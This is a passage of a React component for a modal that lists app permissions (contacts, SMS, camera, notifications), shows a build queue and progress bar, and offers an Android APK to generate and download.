                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Contact names
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Phone numbers
                                                </li>
                                                <li className="flex items-center gap-2">
                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                    Email addresses
                                                </li>
                                            </ul>
                                        </>
                                    )}

                                    <button
                                        onClick={() => setShowPermissionInfo(null)}
                                        className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
                                            ? 'bg-blue-500 hover:bg-blue-600'
                                            : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
                                                ? 'bg-cyan-500 hover:bg-cyan-600'
                                                : 'bg-green-500 hover:bg-green-600'
                                            } text-white transition-colors`}
                                    >
                                        Got it
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {status === 'queued' && (
                    <div className="mb-8">
                        <div className="flex flex-col items-center justify-center py-6">
                            <div className="w-16 h-16 border-4 border-purple-500/30 border-t-purple-500 rounded-full animate-spin mb-4"></div>
                            <h3 className="text-xl font-bold text-white mb-1">You are in Queue</h3>
                            <p className="text-white/60">Position: <span className="text-purple-400 font-bold text-lg">{queuePosition}</span></p>
                            <p className="text-xs text-white/40 mt-4 max-w-xs">Your build will start automatically when the previous one finishes.</p>
                        </div>
                    </div>
                )}

                {(status === 'generating' || status === 'downloading' || status === 'completed') && (
                    <div className="mb-8">
                        <p className="text-white/60 mb-4 font-mono text-sm">
                            {status === 'completed'
                                ? "Install this APK on your Android device."
                                : (progressStep || "Processing...")}
                        </p>
                        <div className="relative h-4 bg-white/10 rounded-full overflow-hidden">
                            <div
                                className="absolute top-0 left-0 h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-500"
                                style={{ width: `${progress}%` }}
                            />
                        </div>
                    </div>
                )}

                <div className="flex flex-col items-center justify-center gap-4">
                    {status === 'idle' ? (
                        <button
                            onClick={startGeneration}
                            className="w-full px-8 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-xl hover:scale-105 transition-transform shadow-lg shadow-purple-500/20"
                        >
                            Generate & Download
                        </button>
                    ) : status === 'completed' ? (
                        <button
                            onClick={onClose}
                            className="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform"
                        >
                            Done
                        </button>
                    ) : status === 'queued' ? (
                        <button
                            disabled
                            className="px-8 py-3 bg-white/10 text-white/50 font-bold rounded-full cursor-not-allowed"
                        >
                            Waiting in Queue...
                        </button>
                    ) : (
                        <>
                            {status !== 'downloading' && <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>}
                            {/* Fallback Download Button */}
                            {downloadUrl && (
                                <a
                                    href={downloadUrl}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="mt-4 text-sm text-blue-300 hover:text-blue-200 underline cursor-pointer animate-pulse"
                                >
                                    Click here if download doesn't start automatically
                                </a>
                            )}
                        </>
                    )}
                </div>

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div >
    );
}
